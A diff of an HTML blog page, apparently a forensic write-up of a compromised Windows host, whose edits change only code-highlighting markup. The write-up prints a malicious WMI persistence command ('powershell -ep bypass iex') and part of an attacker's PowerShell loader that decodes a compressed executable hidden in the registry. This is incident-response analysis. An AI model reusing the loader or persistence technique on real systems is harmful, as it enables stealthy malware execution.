@@ -11,7 +11,7 @@
   <link href="/css/style-classic.css"></link>
   
   
-  <link rel="stylesheet" href="/css/style.min.9d91cbb32c96c334ae7b38c3d99d30727e0836e1182125cc5f007d215f0b9e59.css">
+  <link rel="stylesheet" href="/css/style.min.eeb61b3f25f73088eb3aeb02bc61f28d33975f447fc5649add3b83c10059c331.css">
   
 
   
@@ -365,16 +365,16 @@
 <p><img src="images/hostintel.png" alt="hostintel"></p>
 <p><code>196.6.112.70</code>  - South Africa? Hm, even more weird.</p>
 <h4 id="process-tree">Process Tree</h4>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python39 <span class="c1"># have alias for pyenv activate python39</span>
-vol3 -f memdump.mem windows.pstree.PsTree &gt; rprocess_tree.txt
-</code></pre></div><p>Have found neither children nor parents for <code>rundll32.exe</code>. It becomes even more weird.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python39 <span class="c1"># have alias for pyenv activate python39</span>
+</span></span><span class="line"><span class="cl">vol3 -f memdump.mem windows.pstree.PsTree &gt; rprocess_tree.txt
+</span></span></code></pre></div><p>Have found neither children nor parents for <code>rundll32.exe</code>. It becomes even more weird.</p>
 <p><code>WINWORD.EXE</code> has a parent explorer.exe, and a child <code>WINWORD.EXE</code> spawned in 1 second. There is also another instance of <code>WINWORD.EXE</code> with a different PID, but the parent is the same. Explains two connections.</p>
 <p><code>browser_broker</code> is spawned by svchost.exe just three minutes after system start. Quick google search reveals that it&rsquo;s a Microsoft Edge component. Indeed, going by this process tree, it&rsquo;s installed on the system. Probably, no need to investigate this one for now.</p>
 <h4 id="unlinked-proccesses">Unlinked proccesses</h4>
 <p>Let&rsquo;s compare <code>pslist</code> against <code>psscan</code> results to see unlinked processes:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">vol3 -f memdump.mem windows.pslist.PsList &gt; results/pslist.csv
-vol3 -f memdump.mem windows.psscan.PsScan &gt; results/psscan.csv
-</code></pre></div><p>187 entries in pslist and 189 in psscan. Possible rootkit lurking inside? PIDs 852 and 6496 are the difference:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">vol3 -f memdump.mem windows.pslist.PsList &gt; results/pslist.csv
+</span></span><span class="line"><span class="cl">vol3 -f memdump.mem windows.psscan.PsScan &gt; results/psscan.csv
+</span></span></code></pre></div><p>187 entries in pslist and 189 in psscan. Possible rootkit lurking inside? PIDs 852 and 6496 are the difference:</p>
 <table>
 <thead>
 <tr>
@@ -483,25 +483,25 @@ vol3 -f memdump.mem windows.psscan.PsScan &gt; results/psscan.csv
 <p><img src="images/winlogon_malware1.png" alt="winlogon_malware1"></p>
 <p>Looks like <code>winlogon</code> has some executables injected. But I can only be sure if I see the whole code. This process seems to be too suspicious and I would like to dig deeper: <code>vol3 -f memdump.mem -o results windows.memmap.Memmap --pid 3232 --dump</code>.</p>
 <p>Running <code>xxd pid.3232.vad.0x1a7c79f0000-0x1a7c7a15fff.dmp | more</code> - confirms it&rsquo;s a legal PE executable. This one contains the following strings that are indicators of compromise (meterpreter?):</p>
-<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">priv_elevate_getsystem</span>
-<span class="n">priv_passwd_get_sam_hashes</span>
-<span class="n">priv_fs_get_file_mace</span>
-<span class="n">priv_fs_set_file_mace</span>
-<span class="n">priv_fs_set_file_mace_from_file</span>
-<span class="n">priv_fs_blank_file_mace</span>
-<span class="n">priv_fs_blank_directory_mace</span>
-<span class="p">[...]</span>
-<span class="n">packet_create_response</span>
-<span class="n">packet_add_tlv_string</span>
-<span class="n">packet_transmit_response</span>
-<span class="n">packet_add_tlv_uint</span>
-<span class="n">packet_get_tlv_value_uint</span>
-<span class="n">packet_get_tlv_value_string</span>
-<span class="n">core_update_thread_token</span>
-<span class="n">ext_server_priv</span><span class="p">.</span><span class="n">x64</span><span class="p">.</span><span class="n">dll</span>
-<span class="p">[...]</span>
-<span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">winlogon</span><span class="p">.</span><span class="n">exe</span>
-</code></pre></div><p>Virus Total check for <code>pid.3232.vad.0x1a7c79f0000-0x1a7c7a15fff.dmp</code> confirmed it&rsquo;s a meterpreter. <code>pid.3232.vad.0x1a7c7930000-0x1a7c7962fff.dmp</code>  and <code>pid.3232.vad.0x1a7c7970000-0x1a7c79a9fff.dmp</code> are also detected by some antiviruses as generic exploits. <code>pid.3232.vad.0x1a7c9710000-0x1a7c977bfff.dmp</code> is detected as trojan and exploit by some antiviruses.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">priv_elevate_getsystem</span>
+</span></span><span class="line"><span class="cl"><span class="n">priv_passwd_get_sam_hashes</span>
+</span></span><span class="line"><span class="cl"><span class="n">priv_fs_get_file_mace</span>
+</span></span><span class="line"><span class="cl"><span class="n">priv_fs_set_file_mace</span>
+</span></span><span class="line"><span class="cl"><span class="n">priv_fs_set_file_mace_from_file</span>
+</span></span><span class="line"><span class="cl"><span class="n">priv_fs_blank_file_mace</span>
+</span></span><span class="line"><span class="cl"><span class="n">priv_fs_blank_directory_mace</span>
+</span></span><span class="line"><span class="cl"><span class="p">[...]</span>
+</span></span><span class="line"><span class="cl"><span class="n">packet_create_response</span>
+</span></span><span class="line"><span class="cl"><span class="n">packet_add_tlv_string</span>
+</span></span><span class="line"><span class="cl"><span class="n">packet_transmit_response</span>
+</span></span><span class="line"><span class="cl"><span class="n">packet_add_tlv_uint</span>
+</span></span><span class="line"><span class="cl"><span class="n">packet_get_tlv_value_uint</span>
+</span></span><span class="line"><span class="cl"><span class="n">packet_get_tlv_value_string</span>
+</span></span><span class="line"><span class="cl"><span class="n">core_update_thread_token</span>
+</span></span><span class="line"><span class="cl"><span class="n">ext_server_priv</span><span class="p">.</span><span class="n">x64</span><span class="p">.</span><span class="n">dll</span>
+</span></span><span class="line"><span class="cl"><span class="p">[...]</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">winlogon</span><span class="p">.</span><span class="n">exe</span>
+</span></span></code></pre></div><p>Virus Total check for <code>pid.3232.vad.0x1a7c79f0000-0x1a7c7a15fff.dmp</code> confirmed it&rsquo;s a meterpreter. <code>pid.3232.vad.0x1a7c7930000-0x1a7c7962fff.dmp</code>  and <code>pid.3232.vad.0x1a7c7970000-0x1a7c79a9fff.dmp</code> are also detected by some antiviruses as generic exploits. <code>pid.3232.vad.0x1a7c9710000-0x1a7c977bfff.dmp</code> is detected as trojan and exploit by some antiviruses.</p>
 <p>This <code>xxd pid.3232.vad.0x1a7c9710000-0x1a7c977bfff.dmp | more</code> one as well.</p>
 <p>This <code>xxd pid.3232.vad.0x1a7c7930000-0x1a7c7962fff.dmp | more</code> one looks suspicious as well, but it doesn&rsquo;t start with MZ, but has an executable later on.</p>
 <p><img src="images/winlogon_malware2.png" alt="winlogon_malware2"></p>
@@ -522,19 +522,19 @@ vol3 -f memdump.mem windows.psscan.PsScan &gt; results/psscan.csv
 <p>I have found that there is a malicious WMI consumer (see <a href="#Artefacts-wmi-db">WMI DB</a>). It launches a script. Probably, some logs might contain the script itself&hellip; . Let&rsquo;s use this <code>chainsaw</code> for that:</p>
 <p><code>chainsaw search . -i -s &quot;tmpA7Z2.ps1&quot; &gt; ../results/logsfortmp.txt</code>. There are lots of hits, I won&rsquo;t copy it here. Better analyse them somewhere else.</p>
 <p>I can see evidence of WMI entry creation here as well. So, let&rsquo;s hunt this</p>
-<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">New-PSDrive</span> <span class="n">HKU</span> <span class="n">Registry</span> <span class="n">HKEY_USERS</span><span class="p">\</span><span class="nb">r
-</span><span class="nb"></span><span class="nv">$rk</span> <span class="p">=</span> <span class="p">\</span><span class="s2">&#34;HKU:\\S-1-5-21-3899523589-2416674273-2941457644-1104\\Software\\RegisteredApplications\&#34;</span><span class="p">\</span><span class="nb">r
-</span><span class="nb"></span><span class="nv">$rv</span> <span class="p">=</span> <span class="p">\</span><span class="s2">&#34;AppXs42fd12c3po92dynnq2r142fs12qhvsmyy\&#34;</span><span class="p">\</span><span class="nb">r
-</span><span class="nb"></span><span class="nv">$p</span> <span class="p">=</span> <span class="p">(</span><span class="nb">gp </span><span class="n">-Path</span> <span class="nv">$rk</span> <span class="n">-Name</span> <span class="nv">$rv</span><span class="p">).</span><span class="nv">$rv</span><span class="p">\</span><span class="nb">r
-</span><span class="nb"></span><span class="nv">$CompBytes</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$p</span><span class="p">)\</span><span class="nb">r
-</span><span class="nb"></span><span class="nv">$input</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(,</span><span class="nv">$CompBytes</span><span class="p">)\</span><span class="nb">r
-</span><span class="nb"></span><span class="nv">$output</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">\</span><span class="nb">r
-</span><span class="nb"></span><span class="nv">$gzipStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$input</span><span class="p">,(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">)\</span><span class="nb">r
-</span><span class="nb"></span><span class="nv">$gzipStream</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span><span class="nv">$output</span><span class="p">)\</span><span class="nb">r
-</span><span class="nb"></span><span class="nv">$gzipStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()\</span><span class="nb">r
-</span><span class="nb"></span><span class="nv">$input</span><span class="p">.</span><span class="n">Close</span><span class="p">()\</span><span class="nb">r
-</span><span class="nb"></span><span class="p">[...]</span>
-</code></pre></div><h3 id="artefact-registry"><strong>Artefact</strong>: Registry</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-PSDrive</span> <span class="n">HKU</span> <span class="n">Registry</span> <span class="n">HKEY_USERS</span><span class="p">\</span><span class="nb">r
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$rk</span> <span class="p">=</span> <span class="p">\</span><span class="s2">&#34;HKU:\\S-1-5-21-3899523589-2416674273-2941457644-1104\\Software\\RegisteredApplications\&#34;</span><span class="p">\</span><span class="nb">r
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$rv</span> <span class="p">=</span> <span class="p">\</span><span class="s2">&#34;AppXs42fd12c3po92dynnq2r142fs12qhvsmyy\&#34;</span><span class="p">\</span><span class="nb">r
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$p</span> <span class="p">=</span> <span class="p">(</span><span class="nb">gp </span><span class="n">-Path</span> <span class="nv">$rk</span> <span class="n">-Name</span> <span class="nv">$rv</span><span class="p">).</span><span class="nv">$rv</span><span class="p">\</span><span class="nb">r
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$CompBytes</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$p</span><span class="p">)\</span><span class="nb">r
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$input</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(,</span><span class="nv">$CompBytes</span><span class="p">)\</span><span class="nb">r
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$output</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">\</span><span class="nb">r
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$gzipStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$input</span><span class="p">,(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">)\</span><span class="nb">r
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$gzipStream</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span><span class="nv">$output</span><span class="p">)\</span><span class="nb">r
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$gzipStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()\</span><span class="nb">r
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$input</span><span class="p">.</span><span class="n">Close</span><span class="p">()\</span><span class="nb">r
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="p">[...]</span>
+</span></span></code></pre></div><h3 id="artefact-registry"><strong>Artefact</strong>: Registry</h3>
 <p><strong>Information:</strong></p>
 <ol>
 <li>Startup and auto runs</li>
@@ -554,10 +554,10 @@ vol3 -f memdump.mem windows.psscan.PsScan &gt; results/psscan.csv
 <li>Less frequently and most recently run programs</li>
 </ol>
 <p>🛠 WinPrefetchView, Fred - Forensic Registry Editor, FTK Imager Lite, CDQR, RegRipper (<code>rip.exe -r SYSTEM -p prefetch # to show whether prefetch is enabled</code>), <a href="https://github.com/EricZimmerman/PECmd">PECmd</a> (EZ), Prefetch Parser (last executed, <em>MFT sequence number, MFT record number</em>, executable name, run counter)</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">prefetch.py -c -d -e
-prefetch.py -c -d &gt; pf.csv
-prefetch.py -f &lt;file_to_parse&gt; &gt; pf.txt
-</code></pre></div><h3 id="artefact-mft-file"><strong>Artefact</strong>: $MFT file</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">prefetch.py -c -d -e
+</span></span><span class="line"><span class="cl">prefetch.py -c -d &gt; pf.csv
+</span></span><span class="line"><span class="cl">prefetch.py -f &lt;file_to_parse&gt; &gt; pf.txt
+</span></span></code></pre></div><h3 id="artefact-mft-file"><strong>Artefact</strong>: $MFT file</h3>
 <p><strong>Information</strong>:</p>
 <ol>
 <li>Files deleted</li>
@@ -583,8 +583,8 @@ prefetch.py -f &lt;file_to_parse&gt; &gt; pf.txt
 </ol>
 <p><strong>Path to file</strong> 🛣️: <code>C:\Windows\AppCompat\Programs</code>. So, this one is a separate hive file.</p>
 <p>🛠 Regitsry Browser (EZ), <a href="https://github.com/EricZimmerman/AmcacheParser">AmCache Parser</a> + Timeline Explorer</p>
-<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">AmcacheParser</span><span class="p">.</span><span class="n">exe</span> <span class="o">-f</span> <span class="p">&lt;</span><span class="n">path_to_AmCache</span><span class="p">.</span><span class="n">hve</span><span class="p">&gt;</span> <span class="n">-i</span> <span class="n">on</span> <span class="p">-</span><span class="n">-csv</span> <span class="p">&lt;</span><span class="n">export_to_folder_no_quotes</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-csvf</span> <span class="p">&lt;</span><span class="n">desired_filename</span><span class="p">&gt;</span> 
-</code></pre></div><h3 id="artefact-network-traffic-dump"><strong>Artefact</strong>: network traffic dump</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">AmcacheParser</span><span class="p">.</span><span class="n">exe</span> <span class="o">-f</span> <span class="p">&lt;</span><span class="n">path_to_AmCache</span><span class="p">.</span><span class="n">hve</span><span class="p">&gt;</span> <span class="n">-i</span> <span class="n">on</span> <span class="p">-</span><span class="n">-csv</span> <span class="p">&lt;</span><span class="n">export_to_folder_no_quotes</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-csvf</span> <span class="p">&lt;</span><span class="n">desired_filename</span><span class="p">&gt;</span> 
+</span></span></code></pre></div><h3 id="artefact-network-traffic-dump"><strong>Artefact</strong>: network traffic dump</h3>
 <p><strong>Information</strong>:</p>
 <ol>
 <li>Suspicious DNS resolved</li>
@@ -598,36 +598,36 @@ prefetch.py -f &lt;file_to_parse&gt; &gt; pf.txt
 <p>But it&rsquo;s way too large for a certificate. Let&rsquo;s Base64 decode it to see what&rsquo;s inside. I&rsquo;ll use <a href="https://www.base64decode.org/">this</a> online tool. Well, it claimed to be a <code>png</code>, looked like a cert, but it&rsquo;s a windows executable, look at the header (<code>MZ</code>, <code>PE</code> and sections <code>text</code>, <code>rsrc</code>, <code>reloc</code> and the notable string <code>This program cannot be run in DOS mode</code>):</p>
 <p><img src="images/mzheader.png" alt="mzheader"></p>
 <p>I need a python script to get the bytes for analysis:</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">base64</span>
-<span class="n">string</span><span class="o">=</span><span class="s2">&#34;this is where this fake cert will go&#34;</span>
-
-<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/path/to/malicious.exe&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">exe</span><span class="p">:</span>
-    <span class="n">exe</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">string</span><span class="p">))</span>
-
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;Finished!&#34;</span><span class="p">)</span>
-</code></pre></div><p>I wound if the two request have the same executable sent.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="n">string</span><span class="o">=</span><span class="s2">&#34;this is where this fake cert will go&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/path/to/malicious.exe&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">exe</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exe</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">string</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Finished!&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>I wound if the two request have the same executable sent.</p>
 <p>They are the same:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">➜  results md5 result.exe 
-MD5 <span class="o">(</span>result.exe<span class="o">)</span> <span class="o">=</span> 0e78eb7fc6702f12af6c4ef8aaa485ac
-➜  results md5 result2.exe
-MD5 <span class="o">(</span>result2.exe<span class="o">)</span> <span class="o">=</span> 0e78eb7fc6702f12af6c4ef8aaa485ac
-➜  results 
-</code></pre></div><h3 id="artefact-wmi-db">Artefact: WMI DB</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  results md5 result.exe 
+</span></span><span class="line"><span class="cl">MD5 <span class="o">(</span>result.exe<span class="o">)</span> <span class="o">=</span> 0e78eb7fc6702f12af6c4ef8aaa485ac
+</span></span><span class="line"><span class="cl">➜  results md5 result2.exe
+</span></span><span class="line"><span class="cl">MD5 <span class="o">(</span>result2.exe<span class="o">)</span> <span class="o">=</span> 0e78eb7fc6702f12af6c4ef8aaa485ac
+</span></span><span class="line"><span class="cl">➜  results 
+</span></span></code></pre></div><h3 id="artefact-wmi-db">Artefact: WMI DB</h3>
 <p>🛠: <a href="https://github.com/davidpany/WMI_Forensics/blob/master/PyWMIPersistenceFinder.py">PyWMIPersistenceFinder.py</a>, <code>wmic</code>, <code>powershell</code></p>
-<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">pywmi</span> <span class="n">OBJECTS</span><span class="p">.</span><span class="n">DATA</span> <span class="c"># alias for PyWMIPersistenceFinder.py=pywmi</span>
-<span class="p">[....]</span>
-<span class="n">LogRotate</span> <span class="n">Consumer-LogRotate</span> <span class="n">Event</span>
-            <span class="n">Consumer</span><span class="err">:</span> 
-		<span class="n">Consumer</span> <span class="n">Type</span><span class="err">:</span> <span class="n">CommandLineEventConsumer</span>
-		<span class="n">Arguments</span><span class="err">:</span>     <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-noP</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="nb">iex </span><span class="n">-c</span> <span class="s2">&#34;(&#39;C:\Users\john.goldberg\AppData\Roaming\Microsoft\Office\Recent\tmpA7Z2.ps1&#39;)&#34;</span>
-		<span class="n">Consumer</span> <span class="n">Name</span><span class="err">:</span> <span class="n">LogRotate</span> <span class="n">Consumer</span>
-
-            <span class="k">Filter</span><span class="err">:</span> 
-		<span class="k">Filter</span> <span class="n">name</span><span class="err">:</span>  <span class="n">LogRotate</span> <span class="n">Event</span>
-		<span class="k">Filter</span> <span class="n">Query</span><span class="err">:</span> <span class="nb">SELECT </span><span class="p">*</span> <span class="n">FROM</span> <span class="n">__InstanceCreationEvent</span> <span class="n">WITHIN</span> <span class="n">10</span> <span class="nb">WHERE </span><span class="n">TargetInstance</span> <span class="n">ISA</span> <span class="s1">&#39;Win32_LoggedOnUser&#39;</span>
-</code></pre></div><p>This query:</p>
-<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">__InstanceCreationEvent</span> <span class="n">WITHIN</span> <span class="mi">10</span> <span class="k">WHERE</span> <span class="n">TargetInstance</span> <span class="n">ISA</span> <span class="s1">&#39;Win32_LoggedOnUser&#39;</span>
-</code></pre></div><p>says to launch the command <code>powershell.exe -noP -ep bypass iex -c &quot;('C:\Users\john.goldberg\AppData\Roaming\Microsoft\Office\Recent\tmpA7Z2.ps1')&quot;</code> when a user is logged on. These options <code>-noP -ep bypass iex -c</code> for <code>powershell</code> means:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">pywmi</span> <span class="n">OBJECTS</span><span class="p">.</span><span class="n">DATA</span> <span class="c"># alias for PyWMIPersistenceFinder.py=pywmi</span>
+</span></span><span class="line"><span class="cl"><span class="p">[....]</span>
+</span></span><span class="line"><span class="cl"><span class="n">LogRotate</span> <span class="nb">Consumer-LogRotate</span> <span class="n">Event</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Consumer</span><span class="err">:</span> 
+</span></span><span class="line"><span class="cl">		<span class="n">Consumer</span> <span class="n">Type</span><span class="err">:</span> <span class="n">CommandLineEventConsumer</span>
+</span></span><span class="line"><span class="cl">		<span class="n">Arguments</span><span class="err">:</span>     <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-noP</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="nb">iex </span><span class="n">-c</span> <span class="s2">&#34;(&#39;C:\Users\john.goldberg\AppData\Roaming\Microsoft\Office\Recent\tmpA7Z2.ps1&#39;)&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">Consumer</span> <span class="n">Name</span><span class="err">:</span> <span class="n">LogRotate</span> <span class="n">Consumer</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">Filter</span><span class="err">:</span> 
+</span></span><span class="line"><span class="cl">		<span class="k">Filter</span> <span class="n">name</span><span class="err">:</span>  <span class="n">LogRotate</span> <span class="n">Event</span>
+</span></span><span class="line"><span class="cl">		<span class="k">Filter</span> <span class="n">Query</span><span class="err">:</span> <span class="nb">SELECT </span><span class="p">*</span> <span class="n">FROM</span> <span class="n">__InstanceCreationEvent</span> <span class="n">WITHIN</span> <span class="n">10</span> <span class="nb">WHERE </span><span class="n">TargetInstance</span> <span class="n">ISA</span> <span class="s1">&#39;Win32_LoggedOnUser&#39;</span>
+</span></span></code></pre></div><p>This query:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">__InstanceCreationEvent</span><span class="w"> </span><span class="n">WITHIN</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">TargetInstance</span><span class="w"> </span><span class="n">ISA</span><span class="w"> </span><span class="s1">&#39;Win32_LoggedOnUser&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>says to launch the command <code>powershell.exe -noP -ep bypass iex -c &quot;('C:\Users\john.goldberg\AppData\Roaming\Microsoft\Office\Recent\tmpA7Z2.ps1')&quot;</code> when a user is logged on. These options <code>-noP -ep bypass iex -c</code> for <code>powershell</code> means:</p>
 <ul>
 <li><code>-noP</code> - no profile. I don&rsquo;t yet understand any practical use of this option for the attacker.</li>
 <li><code>-ep</code> - execution policy. Same as <code>Set-ExecutionPolicy Bypass</code>. Means that unsigned scripts from anywhere can be run on the machine.</li>
@@ -645,54 +645,54 @@ MD5 <span class="o">(</span>result2.exe<span class="o">)</span> <span class="o">
 <h3 id="malware-file-2">Malware File 2</h3>
 <p>So, from the OBJECTDATA WMI database I&rsquo;ve detected a malicious Event Consumer (LogRotate Consumer - cunning 😉). This revealed that there was a <code>ps1</code> script somewhere on the system, named <code>tmpA7Z2.ps1</code>. I&rsquo;ve used a keyword search option of <code>chainsaw</code> utility and discovered the script itself that got fully logged in several messages, part by part. I&rsquo;ve assembled that script, but the most important data was at the very start: get some encoded and compressed value from the registry key <code>HKU:\\S-1-5-21-3899523589-2416674273-2941457644-1104\\Software\\RegisteredApplications\</code>.</p>
 <p>Here is the code:</p>
-<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">New-PSDrive</span> <span class="n">HKU</span> <span class="n">Registry</span> <span class="n">HKEY_USERS</span>
-<span class="nv">$rk</span> <span class="p">=</span> <span class="p">\</span><span class="s2">&#34;HKU:\\S-1-5-21-3899523589-2416674273-2941457644-1104\\Software\\RegisteredApplications\&#34;</span>
-<span class="nv">$rv</span> <span class="p">=</span> <span class="p">\</span><span class="s2">&#34;AppXs42fd12c3po92dynnq2r142fs12qhvsmyy\&#34;</span>
-<span class="nv">$p</span> <span class="p">=</span> <span class="p">(</span><span class="nb">gp </span><span class="n">-Path</span> <span class="nv">$rk</span> <span class="n">-Name</span> <span class="nv">$rv</span><span class="p">).</span><span class="nv">$rv</span>
-<span class="nv">$CompBytes</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span>
-<span class="nv">$input</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(,</span><span class="nv">$CompBytes</span><span class="p">)</span>
-<span class="nv">$output</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span>
-<span class="nv">$gzipStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$input</span><span class="p">,(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">)</span>
-<span class="nv">$gzipStream</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span><span class="nv">$output</span><span class="p">)</span>
-<span class="nv">$gzipStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
-<span class="nv">$input</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
-<span class="no">[byte[]]</span> <span class="nv">$PEBytes</span> <span class="p">=</span> <span class="nv">$output</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()</span>
-<span class="p">[...]</span>
-</code></pre></div><p>I&rsquo;ve used 🛠 Registry Explorer (E.Zimmermans tool) to load this hive (<code>NTUSER.DAT</code>) for user <code>john.goldberg</code>, navigated to the above mentioned key, searched for <code>AppXs42fd12c3po92dynnq2r142fs12qhvsmyy </code> subkey and exported its value. So, the code above gets the value from the registry, base64 decodes it and finally decompresses it. I&rsquo;ve then prepared a script to get the final data.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-PSDrive</span> <span class="n">HKU</span> <span class="n">Registry</span> <span class="n">HKEY_USERS</span>
